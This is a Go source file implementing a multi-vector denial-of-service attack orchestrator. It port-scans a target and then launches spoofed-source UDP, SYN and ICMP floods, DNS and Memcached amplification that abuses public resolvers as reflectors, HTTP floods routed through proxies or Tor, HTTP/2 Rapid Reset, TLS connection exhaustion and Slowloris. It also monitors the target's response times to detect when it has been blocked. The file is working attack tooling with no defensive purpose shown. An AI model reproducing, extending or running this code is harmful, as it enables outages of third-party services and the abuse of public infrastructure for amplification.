package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type KillOrchestrator struct {
	cfg          *AttackConfig
	status       chan<- WorkerStats
	stopFlg      int32
	totalSent    int64
	rttMs        int64
	blockedFlg   int32
	openPorts    []int
	spoofU32     []uint32
}

func NewKillOrchestrator(cfg *AttackConfig, status chan<- WorkerStats) *KillOrchestrator {
	return &KillOrchestrator{
		cfg:    cfg,
		status: status,
	}
}

func (k *KillOrchestrator) Stop() {
	atomic.StoreInt32(&k.stopFlg, 1)
}

func (k *KillOrchestrator) stopped() bool {
	return atomic.LoadInt32(&k.stopFlg) != 0
}

func parseMix(ratio string) (udpPct, synPct, httpPct, ampPct int) {
	parts := strings.Split(ratio, ":")
	if len(parts) < 4 {
		return 25, 25, 25, 25
	}
	vals := make([]int, 4)
	for i := 0; i < 4 && i < len(parts); i++ {
		v, err := strconv.Atoi(strings.TrimSpace(parts[i]))
		if err != nil || v < 0 {
			v = 25
		}
		vals[i] = v
	}
	total := vals[0] + vals[1] + vals[2] + vals[3]
	if total == 0 {
		return 25, 25, 25, 25
	}
	return vals[0], vals[1], vals[2], vals[3]
}

func (k *KillOrchestrator) scanCommonPorts(target string) []int {
	ports := []int{21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
		1433, 1521, 2049, 3306, 3389, 5432, 5900, 5985, 6379, 8080, 8443, 9000, 9200, 27017}
	var mu sync.Mutex
	var open []int
	var wg sync.WaitGroup
	for _, p := range ports {
		wg.Add(1)
		go func(port int) {
			defer wg.Done()
			conn, err := net.DialTimeout("tcp", net.JoinHostPort(target, fmt.Sprintf("%d", port)), 500*time.Millisecond)
			if err == nil {
				conn.Close()
				mu.Lock()
				open = append(open, port)
				mu.Unlock()
			}
		}(p)
	}
	wg.Wait()
	return open
}

func (k *KillOrchestrator) Run(done chan<- struct{}) {
	defer func() { done <- struct{}{} }()

	udpPct, synPct, httpPct, ampPct := parseMix(k.cfg.MixRatio)
	total := udpPct + synPct + httpPct + ampPct
	if total == 0 {
		udpPct, synPct, httpPct, ampPct = 25, 25, 25, 25
		total = 100
	}

	maxWorkers := 128
	workers := k.cfg.Workers
	if workers > maxWorkers {
		workers = maxWorkers
	}
	if workers < 16 {
		workers = 16
	}

	udpW := max(1, workers*udpPct/total)
	synW := max(1, workers*synPct/total)
	httpW := max(1, workers*httpPct/total)
	ampW := max(1, workers*ampPct/total)

	targetIP := k.cfg.Target
	targetPort := k.cfg.Port
	spoofPool := k.cfg.SpoofPool
	if len(spoofPool) == 0 {
		spoofPool = make([]string, 100)
		for i := range spoofPool {
			spoofPool[i] = randIP()
		}
	}
	spoofU32 := make([]uint32, len(spoofPool))
	for i, s := range spoofPool {
		spoofU32[i] = parseSpoof(s)
	}
	k.spoofU32 = spoofU32
	SetSpoofPool(spoofU32)

	k.openPorts = k.scanCommonPorts(targetIP)
	if len(k.openPorts) == 0 {
		k.openPorts = []int{targetPort}
	}
	attackPorts := k.openPorts
	if len(attackPorts) > 8 {
		attackPorts = attackPorts[:8]
	}
	duration := k.cfg.Duration
	if duration < 1 {
		duration = 30
	}

	var wg sync.WaitGroup

	// Start high-throughput C batch floods for L3/L4 vectors
	// They will run for the full duration internally
	batchWorkers := min(128, workers)
	for _, p := range attackPorts[:min(3, len(attackPorts))] {
		port := p
		if synW > 0 {
			StartBatchFlood(targetIP, port, 0, batchWorkers/3, 0, duration)
		}
		if udpW > 0 {
			StartBatchFlood(targetIP, port, 1, batchWorkers/3, 1024, duration)
		}
		if synW > 0 {
			StartBatchFlood(targetIP, port, 2, batchWorkers/4, 0, duration)
		}
		_ = port
	}

	// ICMP separate workers
	if synW > 0 {
		for i := 0; i < 16; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for !k.stopped() {
					spoof := spoofPool[rand.Intn(len(spoofPool))]
					SendICMP(targetIP, spoof)
					atomic.AddInt64(&k.totalSent, 1)
				}
			}()
		}
	}

	// Amplification workers (DNS + Memcached on reflectors)
	reflectors := []string{"8.8.8.8", "1.1.1.1", "208.67.222.222", "8.8.4.4", "9.9.9.9",
		"64.6.64.6", "208.67.220.220", "4.2.2.1", "4.2.2.2", "4.2.2.3"}
	if ampW > 0 {
		for _, ref := range reflectors[:8] {
			reflector := ref
			wg.Add(2)
			go func() {
				defer wg.Done()
				for !k.stopped() {
					spoof := spoofPool[rand.Intn(len(spoofPool))]
					DNSAnyAmp(targetIP, spoof, reflector)
					atomic.AddInt64(&k.totalSent, 1)
				}
			}()
			go func() {
				defer wg.Done()
				for !k.stopped() {
					spoof := spoofPool[rand.Intn(len(spoofPool))]
					MemcachedAmp(targetIP, spoof, reflector)
					atomic.AddInt64(&k.totalSent, 1)
				}
			}()
		}
	}

	// Application layer: HTTP + HTTPS on attack ports
	if httpW > 0 {
		for _, p := range attackPorts {
			port := p
			wg.Add(1)
			go func() {
				defer wg.Done()
				flooder := NewHTTPFlooder()
				proxyList := k.cfg.ProxyList
				if len(proxyList) == 0 && k.cfg.TorProxy != "" {
					proxyList = []string{k.cfg.TorProxy}
				}
				go flooder.RunKill(k.cfg.Target, port, httpW,
					k.cfg.RateLimit, duration, proxyList, k.cfg.Jitter, k.status)
				// Wait for orchestrator stop signal, then stop flooder
				for !k.stopped() {
					time.Sleep(1 * time.Second)
				}
				flooder.Stop()
			}()
		}
	}

	// H2 Rapid Reset on HTTPS ports — exhausts HTTP/2 stream table
	if contains(attackPorts, 443) || contains(attackPorts, 8443) {
		for i := 0; i < 12; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for !k.stopped() {
					spoof := spoofPool[rand.Intn(len(spoofPool))]
					H2RapidReset(targetIP, 443, spoof, 500)
					atomic.AddInt64(&k.totalSent, 500)
				}
			}()
		}
	}

	// SSL renegotiation — tries to exhaust server SSL session cache
	if contains(attackPorts, 443) {
		for i := 0; i < 24; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for !k.stopped() {
					conn, err := tls.Dial("tcp", net.JoinHostPort(targetIP, "443"),
						&tls.Config{InsecureSkipVerify: true, MaxVersion: tls.VersionTLS12})
					if err != nil {
						continue
					}
					conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + targetIP + "\r\nConnection: keep-alive\r\n\r\n"))
					conn.Close()
					atomic.AddInt64(&k.totalSent, 1)
				}
			}()
		}
	}

	// Slowloris on HTTP ports — hold connections open, exhaust connection pool
	for _, p := range attackPorts {
		if p == 443 || p == 8443 {
			continue
		}
		port := p
		for i := 0; i < 6; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for !k.stopped() {
					conn, err := net.DialTimeout("tcp", net.JoinHostPort(targetIP, fmt.Sprintf("%d", port)), 5*time.Second)
					if err != nil {
						continue
					}
					conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + targetIP + "\r\nUser-Agent: Mozilla/5.0\r\n"))
					for i := 0; i < 60; i++ {
						if k.stopped() {
							conn.Close()
							return
						}
						conn.Write([]byte(fmt.Sprintf("X-%d: %s\r\n", i, randStr(128))))
						time.Sleep(3 * time.Second)
					}
					conn.Close()
					atomic.AddInt64(&k.totalSent, 1)
				}
			}()
		}
	}

	// RTT monitor goroutine
	var rttWG sync.WaitGroup
	rttWG.Add(1)
	go func() {
		defer rttWG.Done()
		client := &http.Client{
			Timeout: 2 * time.Second,
			Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
		}
		scheme := "http"
		port := targetPort
		for _, p := range k.openPorts {
			if p == 443 {
				scheme = "https"
				port = 443
				break
			}
		}
		url := fmt.Sprintf("%s://%s:%d/", scheme, targetIP, port)
		for !k.stopped() {
			t0 := time.Now()
			resp, err := client.Get(url)
			if err != nil {
				atomic.StoreInt64(&k.rttMs, 999)
				time.Sleep(1 * time.Second)
				continue
			}
			lat := int64(time.Since(t0).Milliseconds())
			atomic.StoreInt64(&k.rttMs, lat)
			if resp.StatusCode == 403 || resp.StatusCode == 429 || resp.StatusCode == 503 {
				atomic.StoreInt32(&k.blockedFlg, 1)
			} else {
				atomic.StoreInt32(&k.blockedFlg, 0)
			}
			resp.Body.Close()
			time.Sleep(3 * time.Second)
		}
	}()

	// Track total across ALL sources (batch + goroutines + HTTP)
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		var prevBatch int64 = 0
		for !k.stopped() {
			select {
			case <-ticker.C:
				batchSent := int64(BatchFloodSent())
				diff := batchSent - prevBatch
				if diff < 0 { diff = batchSent }
				prevBatch = batchSent
				goroSent := atomic.SwapInt64(&k.totalSent, 0)
				total := diff + goroSent
				rtt := atomic.LoadInt64(&k.rttMs)
				method := "KILL"
				if k.blocked() {
					method = "KILL(BACKOFF)"
				} else if rtt > 0 && rtt < 999 {
					method = fmt.Sprintf("KILL-%dms", rtt)
				}
				k.status <- WorkerStats{
					Sent:   total,
					Active: workers * len(attackPorts),
					Rate:   int(total),
					Method: method,
				}
			}
		}
	}()

	// Main loop — sleep until done
	startTime := time.Now()
	for {
		if k.stopped() {
			break
		}
		elapsed := int(time.Since(startTime).Seconds())
		if elapsed >= duration {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	atomic.StoreInt32(&k.stopFlg, 1)
	StopBatchFlood()
	wg.Wait()
	rttWG.Wait()
}

func (k *KillOrchestrator) blocked() bool {
	return atomic.LoadInt32(&k.blockedFlg) != 0
}

var letters = []byte("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

func randStr(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func contains(slice []int, val int) bool {
	for _, v := range slice {
		if v == val {
			return true
		}
	}
	return false
}
